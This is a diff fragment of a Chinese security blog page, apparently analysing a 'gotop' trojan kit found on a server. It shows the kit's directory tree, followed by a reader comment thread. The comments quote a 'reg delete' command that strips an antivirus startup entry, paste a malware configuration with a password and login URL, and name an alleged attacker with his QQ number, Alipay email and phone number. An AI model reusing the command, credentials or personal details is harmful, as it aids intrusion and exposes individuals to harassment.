+|   |   |       |   |   |
+|   |   |       |   |   +---handling
+|   |   |       |   |   |       dialog.js
+|   |   |       |   |   |       handler.css
+|   |   |       |   |   |       handler.xml
+|   |   |       |   |   |
+|   |   |       |   |   +---plugins
+|   |   |       |   |   |       pluginFinderBinding.css
+|   |   |       |   |   |       pluginInstallerDatasource.js
+|   |   |       |   |   |       pluginInstallerService.js
+|   |   |       |   |   |       pluginInstallerWizard.css
+|   |   |       |   |   |       pluginInstallerWizard.js
+|   |   |       |   |   |       pluginProblem.xml
+|   |   |       |   |   |       pluginProblemBinding.css
+|   |   |       |   |   |       pluginProblemContent.css
+|   |   |       |   |   |
+|   |   |       |   |   +---preferences
+|   |   |       |   |   |       changemp.js
+|   |   |       |   |   |       fontbuilder.js
+|   |   |       |   |   |       ocsp.js
+|   |   |       |   |   |       removemp.js
+|   |   |       |   |   |
+|   |   |       |   |   +---profile
+|   |   |       |   |   |       createProfileWizard.js
+|   |   |       |   |   |       profileSelection.js
+|   |   |       |   |   |
+|   |   |       |   |   +---update
+|   |   |       |   |   |       history.js
+|   |   |       |   |   |       updates.css
+|   |   |       |   |   |       updates.js
+|   |   |       |   |   |       updates.xml
+|   |   |       |   |   |
+|   |   |       |   |   \---xpinstall
+|   |   |       |   |           xpinstallConfirm.css
+|   |   |       |   |           xpinstallConfirm.js
+|   |   |       |   |           xpinstallItem.xml
+|   |   |       |   |
+|   |   |       |   +---passwordmgr
+|   |   |       |   |       passwordManager.js
+|   |   |       |   |       passwordManagerCommon.js
+|   |   |       |   |       passwordManagerExceptions.js
+|   |   |       |   |
+|   |   |       |   +---satchel
+|   |   |       |   |       formSubmitListener.js
+|   |   |       |   |
+|   |   |       |   \---xbl-marquee
+|   |   |       |           xbl-marquee.css
+|   |   |       |           xbl-marquee.xml
+|   |   |       |
+|   |   |       +---res
+|   |   |       |       forms.css
+|   |   |       |       hiddenWindow.html
+|   |   |       |       html.css
+|   |   |       |       mathml.css
+|   |   |       |       quirk.css
+|   |   |       |       ua.css
+|   |   |       |       viewsource.css
+|   |   |       |
+|   |   |       \---skin
+|   |   |           \---classic
+|   |   |               +---aero
+|   |   |               |   +---global
+|   |   |               |   |   |   about.css
+|   |   |               |   |   |   aboutCache.css
+|   |   |               |   |   |   aboutCacheEntry.css
+|   |   |               |   |   |   aboutMemory.css
+|   |   |               |   |   |   aboutSupport.css
+|   |   |               |   |   |   appPicker.css
+|   |   |               |   |   |   arrow.css
+|   |   |               |   |   |   autocomplete.css
+|   |   |               |   |   |   button.css
+|   |   |               |   |   |   checkbox.css
+|   |   |               |   |   |   colorpicker.css
+|   |   |               |   |   |   commonDialog.css
+|   |   |               |   |   |   config.css
+|   |   |               |   |   |   customizeToolbar.css
+|   |   |               |   |   |   datetimepicker.css
+|   |   |               |   |   |   dialog.css
+|   |   |               |   |   |   dropmarker.css
+|   |   |               |   |   |   expander.css
+|   |   |               |   |   |   filefield.css
+|   |   |               |   |   |   filepicker.css
+|   |   |               |   |   |   findBar.css
+|   |   |               |   |   |   global.css
+|   |   |               |   |   |   globalBindings.xml
+|   |   |               |   |   |   groupbox.css
+|   |   |               |   |   |   inContentUI.css
+|   |   |               |   |   |   linkTree.css
+|   |   |               |   |   |   listbox.css
+|   |   |               |   |   |   menu.css
+|   |   |               |   |   |   menulist.css
+|   |   |               |   |   |   netError.css
+|   |   |               |   |   |   notification.css
+|   |   |               |   |   |   numberbox.css
+|   |   |               |   |   |   passwordmgr.css
+|   |   |               |   |   |   popup.css
+|   |   |               |   |   |   preferences.css
+|   |   |               |   |   |   printPageSetup.css
+|   |   |               |   |   |   printPreview.css
+|   |   |               |   |   |   progressmeter.css
+|   |   |               |   |   |   radio.css
+|   |   |               |   |   |   resizer.css
+|   |   |               |   |   |   richlistbox.css
+|   |   |               |   |   |   scale.css
+|   |   |               |   |   |   scrollbars.css
+|   |   |               |   |   |   scrollbox.css
+|   |   |               |   |   |   spinbuttons.css
+|   |   |               |   |   |   splitter.css
+|   |   |               |   |   |   tabbox.css
+|   |   |               |   |   |   tabprompts.css
+|   |   |               |   |   |   textbox.css
+|   |   |               |   |   |   toolbar.css
+|   |   |               |   |   |   toolbarbutton.css
+|   |   |               |   |   |   tree.css
+|   |   |               |   |   |   webConsole.css
+|   |   |               |   |   |   webConsole_networkPanel.css
+|   |   |               |   |   |   wizard.css
+|   |   |               |   |   |
+|   |   |               |   |   +---alerts
+|   |   |               |   |   |       alert.css
+|   |   |               |   |   |
+|   |   |               |   |   +---console
+|   |   |               |   |   |       console.css
+|   |   |               |   |   |
+|   |   |               |   |   +---dirListing
+|   |   |               |   |   |       dirListing.css
+|   |   |               |   |   |
+|   |   |               |   |   \---media
+|   |   |               |   |           videocontrols.css
+|   |   |               |   |
+|   |   |               |   \---mozapps
+|   |   |               |       +---downloads
+|   |   |               |       |       downloads.css
+|   |   |               |       |       unknownContentType.css
+|   |   |               |       |
+|   |   |               |       +---extensions
+|   |   |               |       |       about.css
+|   |   |               |       |       blocklist.css
+|   |   |               |       |       eula.css
+|   |   |               |       |       extensions.css
+|   |   |               |       |       newaddon.css
+|   |   |               |       |       selectAddons.css
+|   |   |               |       |       update.css
+|   |   |               |       |
+|   |   |               |       +---handling
+|   |   |               |       |       handling.css
+|   |   |               |       |
+|   |   |               |       +---plugins
+|   |   |               |       |       pluginInstallerWizard.css
+|   |   |               |       |       pluginProblem.css
+|   |   |               |       |
+|   |   |               |       +---profile
+|   |   |               |       |       profileSelection.css
+|   |   |               |       |
+|   |   |               |       +---update
+|   |   |               |       |       updates.css
+|   |   |               |       |
+|   |   |               |       +---viewsource
+|   |   |               |       |       viewsource.css
+|   |   |               |       |
+|   |   |               |       \---xpinstall
+|   |   |               |               xpinstallConfirm.css
+|   |   |               |
+|   |   |               +---global
+|   |   |               |   |   about.css
+|   |   |               |   |   aboutCache.css
+|   |   |               |   |   aboutCacheEntry.css
+|   |   |               |   |   aboutMemory.css
+|   |   |               |   |   aboutSupport.css
+|   |   |               |   |   appPicker.css
+|   |   |               |   |   arrow.css
+|   |   |               |   |   autocomplete.css
+|   |   |               |   |   button.css
+|   |   |               |   |   checkbox.css
+|   |   |               |   |   colorpicker.css
+|   |   |               |   |   commonDialog.css
+|   |   |               |   |   config.css
+|   |   |               |   |   customizeToolbar.css
+|   |   |               |   |   datetimepicker.css
+|   |   |               |   |   dialog.css
+|   |   |               |   |   dropmarker.css
+|   |   |               |   |   expander.css
+|   |   |               |   |   filefield.css
+|   |   |               |   |   filepicker.css
+|   |   |               |   |   findBar.css
+|   |   |               |   |   global.css
+|   |   |               |   |   globalBindings.xml
+|   |   |               |   |   groupbox.css
+|   |   |               |   |   inContentUI.css
+|   |   |               |   |   linkTree.css
+|   |   |               |   |   listbox.css
+|   |   |               |   |   menu.css
+|   |   |               |   |   menulist.css
+|   |   |               |   |   netError.css
+|   |   |               |   |   notification.css
+|   |   |               |   |   numberbox.css
+|   |   |               |   |   passwordmgr.css
+|   |   |               |   |   popup.css
+|   |   |               |   |   preferences.css
+|   |   |               |   |   printPageSetup.css
+|   |   |               |   |   printPreview.css
+|   |   |               |   |   progressmeter.css
+|   |   |               |   |   radio.css
+|   |   |               |   |   resizer.css
+|   |   |               |   |   richlistbox.css
+|   |   |               |   |   scale.css
+|   |   |               |   |   scrollbars.css
+|   |   |               |   |   scrollbox.css
+|   |   |               |   |   spinbuttons.css
+|   |   |               |   |   splitter.css
+|   |   |               |   |   tabbox.css
+|   |   |               |   |   tabprompts.css
+|   |   |               |   |   textbox.css
+|   |   |               |   |   toolbar.css
+|   |   |               |   |   toolbarbutton.css
+|   |   |               |   |   tree.css
+|   |   |               |   |   webConsole.css
+|   |   |               |   |   webConsole_networkPanel.css
+|   |   |               |   |   wizard.css
+|   |   |               |   |
+|   |   |               |   +---alerts
+|   |   |               |   |       alert.css
+|   |   |               |   |
+|   |   |               |   +---console
+|   |   |               |   |       console.css
+|   |   |               |   |
+|   |   |               |   +---dirListing
+|   |   |               |   |       dirListing.css
+|   |   |               |   |
+|   |   |               |   \---media
+|   |   |               |           videocontrols.css
+|   |   |               |
+|   |   |               \---mozapps
+|   |   |                   +---downloads
+|   |   |                   |       downloads.css
+|   |   |                   |       unknownContentType.css
+|   |   |                   |
+|   |   |                   +---extensions
+|   |   |                   |       about.css
+|   |   |                   |       blocklist.css
+|   |   |                   |       eula.css
+|   |   |                   |       extensions.css
+|   |   |                   |       newaddon.css
+|   |   |                   |       selectAddons.css
+|   |   |                   |       update.css
+|   |   |                   |
+|   |   |                   +---handling
+|   |   |                   |       handling.css
+|   |   |                   |
+|   |   |                   +---plugins
+|   |   |                   |       pluginInstallerWizard.css
+|   |   |                   |       pluginProblem.css
+|   |   |                   |
+|   |   |                   +---profile
+|   |   |                   |       profileSelection.css
+|   |   |                   |
+|   |   |                   +---update
+|   |   |                   |       updates.css
+|   |   |                   |
+|   |   |                   +---viewsource
+|   |   |                   |       viewsource.css
+|   |   |                   |
+|   |   |                   \---xpinstall
+|   |   |                           xpinstallConfirm.css
+|   |   |
+|   |   +---components
+|   |   |       addonManager.js
+|   |   |       amContentHandler.js
+|   |   |       amWebInstallListener.js
+|   |   |       browsercomps.dll
+|   |   |       ConsoleAPI.js
+|   |   |       contentAreaDropListener.js
+|   |   |       contentSecurityPolicy.js
+|   |   |       crypto-SDR.js
+|   |   |       FeedConverter.js
+|   |   |       FeedProcessor.js
+|   |   |       FeedWriter.js
+|   |   |       fuelApplication.js
+|   |   |       GPSDGeolocationProvider.js
+|   |   |       jsconsole-clhandler.js
+|   |   |       NetworkGeolocationProvider.js
+|   |   |       nsBadCertHandler.js
+|   |   |       nsBlocklistService.js
+|   |   |       nsBrowserContentHandler.js
+|   |   |       nsBrowserGlue.js
+|   |   |       nsContentDispatchChooser.js
+|   |   |       nsContentPrefService.js
+|   |   |       nsDefaultCLH.js
+|   |   |       nsDownloadManagerUI.js
+|   |   |       nsFormAutoComplete.js
+|   |   |       nsFormHistory.js
+|   |   |       nsHandlerService.js
+|   |   |       nsHelperAppDlg.js
+|   |   |       nsINIProcessor.js
+|   |   |       nsInputListAutoComplete.js
+|   |   |       nsLivemarkService.js
+|   |   |       nsLoginInfo.js
+|   |   |       nsLoginManager.js
+|   |   |       nsLoginManagerPrompter.js
+|   |   |       nsPlacesAutoComplete.js
+|   |   |       nsPlacesExpiration.js
+|   |   |       nsPrivateBrowsingService.js
+|   |   |       nsPrompter.js
+|   |   |       nsProxyAutoConfig.js
+|   |   |       nsSafebrowsingApplication.js
+|   |   |       nsSearchService.js
+|   |   |       nsSearchSuggestions.js
+|   |   |       nsSessionStartup.js
+|   |   |       nsSessionStore.js
+|   |   |       nsSetDefaultBrowser.js
+|   |   |       nsSidebar.js
+|   |   |       nsTaggingService.js
+|   |   |       nsUpdateTimerManager.js
+|   |   |       nsUrlClassifierHashCompleter.js
+|   |   |       nsUrlClassifierLib.js
+|   |   |       nsUrlClassifierListManager.js
+|   |   |       nsURLFormatter.js
+|   |   |       nsWebHandlerApp.js
+|   |   |       PlacesCategoriesStarter.js
+|   |   |       PlacesProtocolHandler.js
+|   |   |       storage-Legacy.js
+|   |   |       storage-mozStorage.js
+|   |   |       TelemetryPing.js
+|   |   |       txEXSLTRegExFunctions.js
+|   |   |       Weave.js
+|   |   |       WebContentConverter.js
+|   |   |
+|   |   +---defaults
+|   |   |   |   black.txt
+|   |   |   |   white.txt
+|   |   |   |
+|   |   |   +---autoconfig
+|   |   |   |       platform.js
+|   |   |   |       prefcalls.js
+|   |   |   |
+|   |   |   +---pref
+|   |   |   |       channel-prefs.js
+|   |   |   |       firefox-branding.js
+|   |   |   |       firefox-l10n.js
+|   |   |   |       firefox.js
+|   |   |   |       services-sync.js
+|   |   |   |
+|   |   |   \---profile
+|   |   |       |   bookmarks.html
+|   |   |       |   prefs.js
+|   |   |       |
+|   |   |       \---chrome
+|   |   |               userChrome-example.css
+|   |   |               userContent-example.css
+|   |   |
+|   |   +---extensions
+|   |   |   \---root@gotop.org
+|   |   |       \---content
+|   |   |               core.js
+|   |   |               emulate.js
+|   |   |               function.js
+|   |   |               gecko.js
+|   |   |               sqlite.js
+|   |   |
+|   |   +---modules
+|   |   |   |   debug.js
+|   |   |   |   distribution.js
+|   |   |   |   Microformats.js
+|   |   |   |   SpellCheckDictionaryBootstrap.js
+|   |   |   |   utils.js
+|   |   |   |
+|   |   |   +---services-crypto
+|   |   |   |       WeaveCrypto.js
+|   |   |   |
+|   |   |   \---services-sync
+|   |   |       |   async.js
+|   |   |       |   constants.js
+|   |   |       |   engines.js
+|   |   |       |   identity.js
+|   |   |       |   jpakeclient.js
+|   |   |       |   log4moz.js
+|   |   |       |   main.js
+|   |   |       |   notifications.js
+|   |   |       |   policies.js
+|   |   |       |   record.js
+|   |   |       |   resource.js
+|   |   |       |   rest.js
+|   |   |       |   service.js
+|   |   |       |   status.js
+|   |   |       |   util.js
+|   |   |       |
+|   |   |       +---engines
+|   |   |       |       bookmarks.js
+|   |   |       |       clients.js
+|   |   |       |       forms.js
+|   |   |       |       history.js
+|   |   |       |       passwords.js
+|   |   |       |       prefs.js
+|   |   |       |       tabs.js
+|   |   |       |
+|   |   |       \---ext
+|   |   |               Observers.js
+|   |   |               Preferences.js
+|   |   |               StringBundle.js
+|   |   |
+|   |   \---res
+|   |           contenteditable.css
+|   |           designmode.css
+|   |           EditorOverride.css
+|   |           svg.css
+|   |
+|   \---etc
+|           config.ini
+|           lang.ini
+|
++---InstallTemp
+|       Autodesk.rar
+|       gotop.rar
+|       qibin.rar
+|       update.rar
+|       weke.rar
+|
++---logs
+|       config.ini
+|       GT.ini
+|       GTexe.ini
+|       htc.ini
+|       ma.ini
+|       qb.ini
+|       rar.ini
+|       sdy.ini
+|       sdyexe.ini
+|       update.ini
+|       weke.ini
+|
++---Network
+|       Network.bat
+|
++---wins
+|       cacls.exe
+|       cmd.exe
+|       cscript.exe
+|       ftp.exe
+|       net.exe
+|       ungini.exe
+|       wscript.exe
+|
+\---x
+        cct.inf
+        Hpqdirv.exe
+        locatar.exe
+        prntcp.vbs
+        reten.inf</pre>
+<p><strong>留言评论（旧系统）：</strong></p>
+<div style="max-height:600px;width:100%;overflow:auto;overflow-x:hidden;">
+<blockquote id="3345,3371,114.112.55.114">
+<p>喵哥 @ 2013-03-14 17:47:55</p>
+<p style="text-indent:2em">核总，  经常来你站看从来不留言的   看到这标题   这风骚的内容  我决定要拿下沙发  然后爆楼下菊花  嘿嘿
+还有 验证码也很风骚</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">你个骚货……</p>
+</blockquote>
+<blockquote id="3346,3371,58.254.92.85">
+<p>佚名 @ 2013-03-14 17:53:10</p>
+<p style="text-indent:2em">这个看上去是相当专业的抓鸡帝啊</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">是的，略专业。</p>
+</blockquote>
+<blockquote id="3347,3371,218.65.102.178">
+<p>nicky @ 2013-03-14 19:51:49</p>
+<p style="text-indent:2em">。。。以前也是只看不回，这次先留名</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">good...</p>
+</blockquote>
+<blockquote id="3348,3371,27.186.194.178">
+<p>核总小弟 @ 2013-03-14 20:16:06</p>
+<p style="text-indent:2em">抓鸡帝  +1
+
+貌似我在3年前也是抓鸡帝出身!!!挖哈哈  括弧笑  省略号笑()()()...........</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">括弧笑。</p>
+</blockquote>
+<blockquote id="3349,3371,113.91.133.215">
+<p>佚名 @ 2013-03-14 21:41:57</p>
+<p style="text-indent:2em">总之一句话 遇到 核总的朋友就注定被爆</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">菊花残，满地伤。</p>
+</blockquote>
+<blockquote id="3350,3371,59.51.239.23">
+<p>雨路 @ 2013-03-14 21:58:13</p>
+<p style="text-indent:2em">无耻，极度无耻！ 哈哈</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">╮(╯_╰)╭</p>
+</blockquote>
+<blockquote id="3351,3371,27.156.110.75">
+<p>佚名 @ 2013-03-14 22:27:51</p>
+<p style="text-indent:2em">十分的有才，太骚了。。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">风骚淫荡二。</p>
+</blockquote>
+<blockquote id="3352,3371,119.101.217.17">
+<p>佚名 @ 2013-03-14 22:32:07</p>
+<p style="text-indent:2em">赔我肉鸡</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">赔我服务器！</p>
+</blockquote>
+<blockquote id="3353,3371,120.69.81.139">
+<p>Getshell @ 2013-03-15 02:43:07</p>
+<p style="text-indent:2em">核总就是NB...膜拜</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">O(∩_∩)O~</p>
+</blockquote>
+<blockquote id="3354,3371,1.202.23.123">
+<p>佚名 @ 2013-03-15 08:51:36</p>
+<p style="text-indent:2em">赔我肉鸡</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">赔我服务器</p>
+</blockquote>
+<blockquote id="3355,3371,112.241.179.202">
+<p>dashige @ 2013-03-15 09:21:30</p>
+<p style="text-indent:2em">主要想看爆菊过程，而不是一地残菊。。。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">过程太长了，当时一心在清理后门，木有记录。。。</p>
+</blockquote>
+<blockquote id="3356,3371,183.196.228.69">
+<p>佚名 @ 2013-03-15 09:21:38</p>
+<p style="text-indent:2em">苦比了吧傻眼了吧，这是我的蜜罐，还天真的以为是把我搞了，笑而不语，轻抚核总菊花。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">╮(╯_╰)╭</p>
+</blockquote>
+<blockquote id="3358,3371,183.196.228.69">
+<p>佚名 @ 2013-03-15 09:23:55</p>
+<p style="text-indent:2em">1+1 等于几？等于二！！！你个苦比非主流黑阔</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">等于三！</p>
+</blockquote>
+<blockquote id="3360,3371,218.66.48.249">
+<p>佚名 @ 2013-03-15 09:41:53</p>
+<p style="text-indent:2em">reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v &quot;360safe&quot; /f
+这个可以直接删除360启动项？貌似不行吧</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">是的，我也是这么想的，权限严重不足啊，只能说这货二。</p>
+</blockquote>
+<blockquote id="3370,3371,118.194.241.126">
+<p>pic @ 2013-03-15 12:25:54</p>
+<p style="text-indent:2em">&lt;--  I love this pic</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">me too.</p>
+</blockquote>
+<blockquote id="3372,3371,113.91.129.193">
+<p>佚名 @ 2013-03-15 13:14:34</p>
+<p style="text-indent:2em">昨天来过啊。
+发现标题来个劲爆的。
+为什么核总发其他文章没什么人回复
+发这类怎么给力的文章。集合吊众们来这里谈欢！
+（可以考虑发多点这类啦。！）</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">这类内容不是很多，很少有。</p>
+</blockquote>
+<blockquote id="3373,3371,60.6.254.176">
+<p>佚名 @ 2013-03-15 13:35:07</p>
+<p style="text-indent:2em">核总这次是真怒了啊 。。。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">晕，你想哪去了，只是碰巧见到，顺便分析了下……</p>
+</blockquote>
+<blockquote id="3376,3371,119.145.5.125">
+<p>helen @ 2013-03-15 16:59:44</p>
+<p style="text-indent:2em">吓尿了！大侠饶命！！！</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">-_-|||</p>
+</blockquote>
+<blockquote id="3379,3371,222.213.47.77">
+<p>寸芒水王 @ 2013-03-15 18:03:59</p>
+<p style="text-indent:2em">哥哥，话说能教我抓鸡吗？？</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">抓你妹！</p>
+</blockquote>
+<blockquote id="3381,3371,220.174.73.80">
+<p>helen大徒弟 @ 2013-03-15 18:20:42</p>
+<p style="text-indent:2em">求教抓鸡！</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">http://www.baidu.com/s?wd=%E6%8A%93%E9%B8%A1+%E7%9B%97%E5%8F%B7+%E5%88%B7%E9%92%BB+%E6%8B%9C%E5%B8%88</p>
+</blockquote>
+<blockquote id="3383,3371,118.251.118.74">
+<p>国际安全组织 @ 2013-03-15 18:43:23</p>
+<p style="text-indent:2em">开门！查水表</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">已将大炮对准大门，请进。</p>
+</blockquote>
+<blockquote id="3384,3371,118.114.65.205">
+<p>佚名 @ 2013-03-15 19:32:04</p>
+<p style="text-indent:2em">我能说碉堡了吗？</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">╮(╯_╰)╭</p>
+</blockquote>
+<blockquote id="3386,3371,112.243.42.85">
+<p>黑阔 @ 2013-03-15 21:50:47</p>
+<p style="text-indent:2em">黑阔？
+为啥踢我出群？。。
+靠！！！</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">额，定期清理很久不发言的，和注册资料疑似QQ广告的，重加……</p>
+</blockquote>
+<blockquote id="3388,3371,183.234.48.29">
+<p>佚名 @ 2013-03-16 08:50:25</p>
+<p style="text-indent:2em">大神,你还有哪些朋友的,下次搞站时好路过啊..</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">搞了就知道。。。。没那么巧遇上的……</p>
+</blockquote>
+<blockquote id="3389,3371,113.96.134.41">
+<p>小鱼 @ 2013-03-16 09:54:11</p>
+<p style="text-indent:2em">扫1433弱口令一天能搞到那么多  ooxx</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">lol...</p>
+</blockquote>
+<blockquote id="3390,3371,61.157.210.128">
+<p>佚名 @ 2013-03-16 10:55:04</p>
+<p style="text-indent:2em">射到此人QQ:297860780 李耀辉  支付宝：zinet@126.com
+希望核总在射点东西出来</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">还在搞啊。。。</p>
+</blockquote>
+<blockquote id="3393,3371,222.209.143.126">
+<p>日月 @ 2013-03-16 20:48:34</p>
+<p style="text-indent:2em">核总，爆菊感觉如何</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">╮(╯_╰)╭</p>
+</blockquote>
+<blockquote id="3398,3371,58.53.151.24">
+<p>佚名 @ 2013-03-16 22:45:00</p>
+<p style="text-indent:2em">核总被暴菊了....!</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">懒得回……</p>
+</blockquote>
+<blockquote id="3400,3371,36.44.67.26">
+<p>佚名 @ 2013-03-17 01:09:11</p>
+<p style="text-indent:2em">支付宝会是真的吗？  QQ号会是真的吗？  手机号会是自己身份证办的吗  
+是脑残就会是真的</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">至于你信不信，反正我是信了！（另外，对现在的互联网来说，只要有你IP与具体时间戳，就等于有了你的身份证……）</p>
+</blockquote>
+<blockquote id="3401,3371,122.226.78.178">
+<p>佚名 @ 2013-03-17 10:44:51</p>
+<p style="text-indent:2em">求1433下载地址.....</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">文中有原始文件下载地址。</p>
+</blockquote>
+<blockquote id="3417,3371,121.207.175.230">
+<p>Helen @ 2013-03-18 09:19:13</p>
+<p style="text-indent:2em">做的不错  我是你helen哥</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">[暂无回复]</p>
+</blockquote>
+<blockquote id="3432,3371,221.7.151.180">
+<p>佚名 @ 2013-03-19 13:40:11</p>
+<p style="text-indent:2em">在江湖混不容易啊。。乱搞更是不对啊！</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">╮(╯_╰)╭。。。。。</p>
+</blockquote>
+<blockquote id="3539,3371,220.113.254.110">
+<p>没名字 @ 2013-03-31 21:26:50</p>
+<p style="text-indent:2em">偶然搜信息，来到贵地，写的好啊。赞一个先。
+话说，每一个头像符合我身份的。就匿名了吧</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">lol...</p>
+</blockquote>
+<blockquote id="3664,3371,120.197.112.34">
+<p>佚名 @ 2013-04-15 12:52:52</p>
+<p style="text-indent:2em">站长，我要学怎么知道这个文件是病毒和木马还是后门，应该学那些基础，谢谢，达到你的十分之一，我应该学什么基础，谢谢</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">此问题牵扯的面太广，无法回答。</p>
+</blockquote>
+<blockquote id="3665,3371,210.22.114.34">
+<p>诗人博客 @ 2013-04-16 11:41:19</p>
+<p style="text-indent:2em">核总威武！</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">6789...</p>
+</blockquote>
+<blockquote id="3671,3371,58.250.212.201">
+<p>236686623 @ 2013-04-17 15:26:52</p>
+<p style="text-indent:2em">我的服务器这几天也中了这个叼毛的 木马  360杀毒软件 没用拦不住 
+配置文件
+[web7b]
+username=zinet
+password=f6e8bf6d651553f3
+adslauto=1
+adslname=
+adsltype=0
+kjqd=1
+hide=1
+zexe=9528
+zt=0
+jf=12856
+ip=58.250.212.201
+rwzs=1
+type=2
+id=23650
+lj=C:\WINDOWS\appmgmt\bplaysvr.exe
+name=bplaysvr.exe
+desk=65552
+server=1
+userid=29257
+
+帐号登录网址 http://123.183.218.33/index.asp  
+zinet
+13005520499    里面有1万多积分</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">哈哈哈，这“黑阔”要蛋疼了……</p>
+</blockquote>
+<blockquote id="3674,3371,121.236.180.210">
+<p>佚名 @ 2013-04-18 06:32:54</p>
+<p style="text-indent:2em">留言内容：
+1+1 等于几？等于二！！！你个苦比非主流黑阔
+站长回复：
+等于三！
+
+这个是不是说等于10的是专业的，等于2的都肥猪流？哈哈  另附：27、请问宇宙第一强国是？ 果然被我猜中，韩国</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">药药，且可闹……</p>
+</blockquote>
+<blockquote id="3838,3371,115.238.160.194">
+<p>佚名 @ 2013-05-02 08:36:29</p>
+<p style="text-indent:2em">我的电脑被干上了</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">纳尼？</p>
+</blockquote>
+<blockquote id="4000,3371,14.18.25.70">
+<p>麦子 @ 2013-05-20 00:50:24</p>
+<p style="text-indent:2em">核总有办法一键干掉这gotop么.... ？</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">what?</p>
+</blockquote>
+<blockquote id="4001,3371,219.136.187.130">
+<p>麦子 @ 2013-05-20 13:00:06</p>
+<p style="text-indent:2em">昨天下载了个软件，双击安装程序之后发现鼠标闪了一下便没了动静。然后发现进程多了gotop.exe
+检查C盘发现中招了...想找个一键查杀工具发现没找到，最后手动干掉了...
+那货的提现密码没有搞到...</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">gotop很火嘛……
+这个不需要一键，通过进程找到安装目录，删掉即可，然后干掉对应的启动项，最后检查下有没有其他木马。</p>
+</blockquote>
+<blockquote id="4021,3371,123.150.219.54">
+<p>焦点访谈 @ 2013-05-21 22:49:34</p>
+<p style="text-indent:2em">焦点访谈以前就报道过一次.抓鸡黑客,好像入侵的水利发电站.
+还看到了饭客的Ghost.</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">那个水利发电站纯属是抓鸡黑客，剧情十分狗血……</p>
+</blockquote>
+<blockquote id="4536,3371,114.139.239.251">
+<p>黑阔小胡 @ 2013-07-20 22:35:42</p>
+<p style="text-indent:2em">又是一个会抓鸡的SB！哈哈</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">哈哈哈，我为鸡狂！……囧rz……</p>
+</blockquote>
+<blockquote id="4648,3371,210.41.243.3">
+<p>佚名 @ 2013-08-03 09:47:39</p>
+<p style="text-indent:2em">帅气</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">Nice~</p>
+</blockquote>
+<blockquote id="4757,3371,61.158.132.177">
+<p>凌乱 @ 2013-08-16 20:21:07</p>
+<p style="text-indent:2em">蛋疼。。。学习了。。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">学习了。。蛋疼。。。</p>
+</blockquote>
+<blockquote id="5162,3371,121.24.8.67">
+<p>佚名 @ 2013-10-21 18:57:00</p>
+<p style="text-indent:2em">我也遇到了，我邮箱是lion2743@qq.com,有wd5但是登不上去，求指教。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">新版的已修改，点击后不能登陆后台……</p>
+</blockquote>
+<blockquote id="5242,3371,220.166.222.22">
+<p>佚名 @ 2013-11-09 23:50:27</p>
+<p style="text-indent:2em">大牛，学习了。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">good good study, day day up~</p>
+</blockquote>
+<blockquote id="5800,3371,14.220.179.187">
+<p>我勒个去 @ 2014-02-08 11:52:39</p>
+<p style="text-indent:2em">访问已拒绝
+详细信息:
+网页:	http://lcx.cc/?i=3371
+注释:	对此网页的访问已被 ESET Smart Security 阻止。 此网页已被列入具有潜在危险内容的网站黑名单中。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">这是误报，可能是因为本文内容包含大量木马病毒样本导致。</p>
+</blockquote>
+<blockquote id="6114,3371,120.199.57.179">
+<p>佚名 @ 2014-03-27 12:51:30</p>
+<p style="text-indent:2em">出于偶然看到了这篇文章，看来我还要多学习啊。。。。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">good good study, day day up~</p>
+</blockquote>
+<blockquote id="6621,3371,60.181.108.102">
+<p>佚名 @ 2014-06-21 05:16:23</p>
+<p style="text-indent:2em">请在这里填写留言内容，最长不超过 1000 字。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">[暂无回复]</p>
+</blockquote>
+<blockquote id="7832,3371,118.181.212.138">
+<p>佚名 @ 2015-09-04 00:08:55</p>
+<p style="text-indent:2em">大牛好腻害 膜拜</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">-_-!!!</p>
+</blockquote>
+<blockquote id="7884,3371,123.120.121.150">
+<p>狼狼恶狗 @ 2015-09-23 10:29:44</p>
+<p style="text-indent:2em">好叼</p>
